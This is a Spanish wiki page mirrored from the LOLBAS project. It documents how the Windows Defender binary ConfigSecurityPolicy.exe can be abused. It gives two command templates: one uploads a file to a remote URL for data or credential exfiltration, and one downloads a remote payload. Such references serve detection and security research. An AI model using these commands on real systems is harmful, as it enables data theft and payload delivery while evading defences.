# LOLBAS: ConfigSecurityPolicy.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`, `Upload`

Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.

## Comandos

### Upload file

Upload · priv: User · T1567

```cmd
ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
```

Upload file, credentials or data exfiltration in general

### Downloads payload from remote server

Download · priv: User · T1105

```cmd
ConfigSecurityPolicy.exe {REMOTEURL}
```

It will download a remote payload and place it in INetCache.

